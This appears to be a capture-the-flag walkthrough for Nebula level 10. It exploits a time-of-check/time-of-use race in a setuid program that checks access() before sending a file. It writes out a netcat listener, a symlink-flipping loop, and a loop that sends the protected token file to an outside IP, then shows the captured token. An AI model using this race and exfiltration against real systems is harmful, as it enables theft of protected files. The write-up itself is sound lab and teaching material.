**Intro**

This level gives a good clue in the *about* section as to how the flag may be captured. 

Firs, usage is displayed by executing the command without any arguments

```
﻿level10@nebula:/home/flag10$ ./flag10
./flag10 file host
	sends file to host if you have access to it
```

Further examining the source reveals that the destination port is 18211.

```
printf("Connecting to %s:18211 .. ", host); fflush(stdout);
```

So first thing to do is setup a netcat listener to capture our data.

**Command on target host**
```
netcat -k -l 18211
```

Next, we'll examine the `access()` system call.

According to the [access() documentation](http://man7.org/linux/man-pages/man2/access.2.html):

```
Warning: Using these calls to check if a user is authorized to, for
       example, open a file before actually doing so using open(2) creates a
       security hole, because the user might exploit the short time interval
       between checking and opening the file to manipulate it.  For this
       reason, the use of this system call should be avoided.
```

As it is, a race condition can be exploited to transfer the file.
  
The trick is to toggle between a file we have access to and the one we want.

While access() will dereference symbolic links to determine if a user has access to a file, if we can switch the link from a file we have access to, to the token we want, we should be able to steal the data we need.

**Toggling a symlink at the speed of while**

```
while :; do ln -fs /tmp/token10 /tmp/token; ln -fs /home/flag10/token /tmp/token; done
```

With this loop running we can run ls in /tmp and catch the link flip-flopping between the files

```
﻿lrwxrwxrwx 1 level10 level10 token -> /tmp/token10

﻿lrwxrwxrwx 1 level10 level10 token -> /home/flag10/token
```

Next is to run the transfer at a high rate of speed so that the `flag10` binary reads the link while it has access to /tmp/token10 but when it does the transfer, the link has flopped back to the token file.


**Racing against time**

```
while :; do ./flag10 /tmp/token 192.168.56.102; done
```

On the target host data will begin streaming by, including the data we need if the race condition becomes true

```
﻿.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
.oO Oo.
```

**Flag Captured**

```
﻿level10@nebula:/home/flag10$ su - flag10
Password: 
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
```
